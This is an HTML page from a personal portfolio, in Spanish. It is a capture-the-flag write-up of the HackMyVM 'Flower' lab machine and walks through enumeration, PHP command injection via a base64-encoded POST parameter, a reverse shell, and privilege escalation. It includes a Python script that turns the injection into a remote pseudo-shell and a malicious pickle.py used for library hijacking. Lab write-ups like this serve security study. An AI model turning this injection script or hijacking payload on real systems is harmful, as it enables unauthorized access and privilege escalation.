@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>C1b3r_F0lio</title>
+
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- Boostrap -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+	
+	<!-- footer -->
+	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+	<link rel="stylesheet" href="../css/footer.css">
+
+	<!-- top button -->
+	<link rel="stylesheet" href="../css/topbutton.css">
+
+</head>
+<body class="bg-dark">
+
+	<header>
+		<div> <!--navbar -->
+			<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo03" aria-controls="navbarTogglerDemo03" aria-expanded="false" aria-label="Toggle navigation">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<a class="navbar-brand" href="../index.html">C1b3r_F0lio</a>
+
+			<div class="collapse navbar-collapse" id="navbarTogglerDemo03">
+				<ul class="navbar-nav mr-auto mt-2 mt-lg-0">
+					<li class="nav-item">
+						<a class="nav-link" href="../index.html">Home</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="../challenges.html">Challenges</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="../proyectos.html">Proyectos</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="../logros.html">Logros</a>
+					</li>
+				</ul>
+			</div>
+		</nav>
+		</div>
+		<div> <!--background image -->
+			<img src="../images/background.gif" class="img-fluid" alt="Responsive image">
+		</div>
+	</header>
+	<br/>
+	<main class="container bg-dark text-white">
+		<div class="row">
+            <div class="col col-10">
+    		  <h1 class="display-4">HackMyVM - Flower</h1>
+            </div>
+            <div class="col col-2 d-flex flex-row-reverse">
+                 <h5 class="text-secondary">2 junio 2021</h5>
+            </div>
+		</div>
+		
+		<p>Esta máquina se encuentra en la plataforma <a href="https://hackmyvm.eu/">HackMyVM</a> y ha sido creada por el usuario <em><a href="https://github.com/AL1ENUM/">alienum</a></em>.</p>
+
+		<p>Es una máquina fácil y muy interesante debido al uso de burpsuite para la explotación.</p>
+
+		<hr>
+		<h4 class="d-flex justify-content-center">Enumeración</h4>
+		<hr>
+
+		<p>Como todas las máquinas de esta plataforma es necesario conocer la dirección IP de la máquina. Para ello utilizaré la herramienta <a href="../proyectos/ping-sweep.html">ping-sweep</a> con el modo de descubrimiento de sistema operativo para poder avanzar más rápido en la enumearción. El motivo de utilizar esta herramienta y no otra basada en el protocoo ARP se debe a que despliego las máquinas en una red privada que utilizo como laboratorio y distinta a la red local, por lo que un descubrimiento mediante ARP no detectará las máquinas.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/1.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>La herramienta ha detectado 4 IP:</p>
+		<ul>
+			<li>10.10.10.1 - linux → Gateway</li>
+			<li>10.10.10.100 - linux → Raspberry</li>
+			<li>10.10.10.101 - linux → Máquina objetivo</li>
+			<li>10.10.10.103 - windows → Host anfitrión</li>
+		</ul>
+
+		<p>Una vez identificada la máquina objetivo se comienza con el escaneo de puertos. Como es habitual para el escaneo se utiliza nmap y se divide en dos fases: la primera de un escaneo rápido de los 65535 puertos para detectar aquellos abiertos y la segunda para realizar una enumeración más exahustiva usando scripts básicos de los puertos abiertos. </p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/2.png" alt="error loading image :(" class="img-fluid">
+		</div>
+		<p>Tras el escaneo básico se utiliza la herramienta <a href="https://github.com/migue27au/get-ports">get-ports</a> para copiar los puertos en la clipboard y facilitar el segundo escaneo.</p>
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/3.png" alt="error loading image :(" class="img-fluid">
+		</div>
+		<br/>
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/4.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>El escaneo solo ha descubierto el puerto 80 con el servicio Apache httpd 2.4.38. Se utiliza la herramienta whatweb para realizar una enumeración básica de este servicio.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/5.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Whatweb no ha descubierto nada interesante, algo extraño por lo que se utiliza el navegador para ver si existe contenido en esa web.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/6.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>La web es un contador de pétalos de distintos tipos de flor. Para poder jugar con esta web de forma más dinámica se va a utilizar Burp Suite.</p>
+
+		<p>En Burp Suite se realiza una primera petición y se manda al repeter. Una vez esto se van probando distintos payloads de la petición POST en búsqueda de un RCE (Remote Command Execution).</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/7.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>La petición POST envía un contenido codificado como base64, este contenido se decodifica y se descubre que se envía una operación suma al servidor. </p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/8.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Probando a codificar una suma distinta, por ejemplo 100+100 el servidor debería responder 200 petals.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/9.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Exactamente, ahora podemos utilizar el servidor como calculadora. Sin embargo, lo que interesa es poder ejecutar comandos a nivel de sistema para lo que habrá que probar distintas configuraciones hasta dar con la forma de ejecutar comandos.</p>
+
+		<p>Tras varias pruebas se da con que la forma de ejecutar comandos es con la inyección PHP → system('comando') y codificado en base64.
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/10.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<hr>
+		<h4 class="d-flex justify-content-center">Ganar acceso</h4>
+		<hr>
+
+		<p>A continuación, se crea un script en Python3 para facilitar el proceso de inyección de comandos formateando la salida y crear un pseudo-terminal con el que poder trabajar más fácilmente.</p>
+
+		<div class="border border-info">
+                <div class=" mt-3 ml-4">
+                    <code><pre class="text-white">
+#!/usr/bin/python3
+
+import requests as request
+import base64
+import os
+
+url = "http://10.10.10.101/index.php"
+
+
+while True:
+	cmd = input(">")
+	cmd = "system('" + cmd + " | base64;')"
+	cmd = cmd.encode("ascii")
+	cmd = base64.b64encode(cmd)
+	data = {"petals": cmd}
+	#print(data)
+	response = request.post(url, data=data)
+
+	response_data = response.text
+	response_data = response_data.split("\n")
+	
+	for r in range(len(response_data)):
+		response_data[r] = response_data[r].replace("     ", "").replace("\t", "").replace("   ", "")
+
+	h2_init = response_data.index("&lt;h2&gt;") + 1
+	h2_end = response_data.index("&lt;/h2&gt;") - 1
+
+	#print(h2_init)
+	#print(h2_end)
+
+	#print(response.text)
+	#print(len(response_data))
+	#print(response_data)
+	#print(response_data[len(response_data)-1-5])
+	cmd_response = response_data[h2_init:h2_end]
+
+	output64 = ''.join(cmd_response)
+	output = str(base64.b64decode(output64))[2:-3]
+	output = output.replace("\\n", "\n")
+	print(output)</pre></code></div></div>
+	<br/>
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/11.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Ahora hay que convertir el pseudo-terminal en un terminal real ejecutando una Reverse Shell.</p>
+		<p>Primero se comprueba cual es la dirección IP de la máquina del atacante para saber a qué dirección IP hay que enviar la Reverse Shell</p>
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/12.png" alt="error loading image :(" class="img-fluid">
+		</div>
+		<p>Se utiliza netcat para escuchar en el puerto 443 y se envía por la pseudo-terminal previamente creada la instrucción para enviar una Reverse Shell hasta la máquina de atacante.</p>
+		<div class="row">
+			<div class="col">
+				<div class="d-flex justify-content-center">
+					<img loading="lazy" src="../images/challenges/flower/13a.png" alt="error loading image :(" class="img-fluid">
+				</div>
+			</div>
+			<div class="col">
+				<div class="d-flex justify-content-center">
+					<img loading="lazy" src="../images/challenges/flower/13b.png" alt="error loading image :(" class="img-fluid">
+				</div>
+			</div>
+		</div>
+
+		<p>Ahora se realiza un tratamiento de la TTY para poder interactuar con la reverse shell como si fuese una terminal normal y poder utilizar CTRL+C, CTRL+L, CTRL+SHIFT+C, etc. TheHackerSnow tiene una página dedicada al tratamiento de TTY que explica en gran detalle todo lo necesario para realizarlo: <a href="https://thehackersnow.com/tratamiento-de-una-tty/">https://thehackersnow.com/tratamiento-de-una-tty/</a>.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/14.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Ya se ha conseguido acceso a la máquina ahora a empezar con la escalada de privilegios.</p>
+
+		<hr>
+		<h4 class="d-flex justify-content-center">Escalada de privilegios</h4>
+		<hr>
+
+		<p>Primero se averiguan los usuarios del sistema consultado en archivo /etc/passwd y se descubre que existe el usuario "rose".</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/14.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Ahora se comprueban los privilegios que tiene el usuario www-data y se ve que tiene permisos para ejecutar /usr/bin/python3 sobre el archivo /home/rose/diary/diary.py como el usuario rose.
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/15.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Viendo el archivo diary.py se comprueba que hace uso de una librería de python llamada pickle. Para escalar al usuario rose se prueba un library hijacking sobre esta librería. Para realizar este ataque se crea un achivo pickle.py en el mismo directorio que diary.py con el siguiente contenido.</p>
+
+		<div class="border border-info">
+                <div class=" mt-3 ml-4">
+                    <code><pre class="text-white">
+import os
+os.system('/bin/bash')
+</pre></code></div></div>
+		
+		<p>Ahora al ejecutar el archivo diary.py con sudo como el usuario rose deberá ejecutarse la librería maliciosa generando una bash como el usuario rose.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/16.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Una vez siendo rose se puede consultar el contenido del archivo user.txt y recuperar la flag de user.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/17.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Ahora hay que escalar a root, para ello se comprueban los privilegios de rose y se ve que puede ejecutar como root el archivo .plantbook</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/18.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>El archivo .plantbook es un script de bash ejecutable con el siguiente contenido.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/19.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Comprobando los permisos de rose sobre ese archivo se observa que tiene permisos de escritura. Por lo que para la escalada a root simplemente se modifica el archivo incluyendo al final la ejecución de una bash privilegiada.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/20.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+		<p>Siendo root ya puede consultarse la flag root.txt y terminar el CTF.</p>
+
+		<div class="d-flex justify-content-center">
+			<img loading="lazy" src="../images/challenges/flower/21.png" alt="error loading image :(" class="img-fluid">
+		</div>
+
+	</main>
+	<br/>
+	<footer class="container">
+		<div class="row">
+			<div class="col">
+				<a href="../challenges.html"> ← Volver </a>
+			</div>
+			<div class="col">
+				<div class="d-flex flex-row-reverse">
+					<ul class="social-network social-circle"> <!-- thanks to https://codepen.io/NamiqNamaz/pen/QZYyEq --> 		<li>
+							<a href="https://github.com/migue27au" class="icoGithub" title="Facebook"><i class="fa fa-github" style="color: white;"></i></a>
+						</li>
+						<li>
+							<a href="https://www.linkedin.com/in/migue27au" class="icoLinkedin" title="Linkedin"><i class="fa fa-linkedin" style="color: white;"></i></a>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+	</footer>
+
+
+	<a id="topBtn" class="text-primary" onclick="toTop()"><i class="fa fa-angle-up fa-3x"></i></a>
+	<script type="text/javascript">
+		//Get the button:
+		btn = document.getElementById("topBtn");
+
+		// When the user scrolls down 20px from the top of the document, show the button
+		window.onscroll = function() {scrollFunction()};
+		function scrollFunction() {
+			if (document.body.scrollTop > 700 || document.documentElement.scrollTop > 700) {
+				btn.style.opacity = "1";
+			} else {
+				btn.style.opacity = "0";
+			}
+		}
+
+		// When the user clicks on the button, scroll to the top of the document
+		function toTop() {
+			document.body.scrollTop = 0; // For Safari
+			document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+		}
+	</script>
+
+</body>
+</html>
+
+
+	
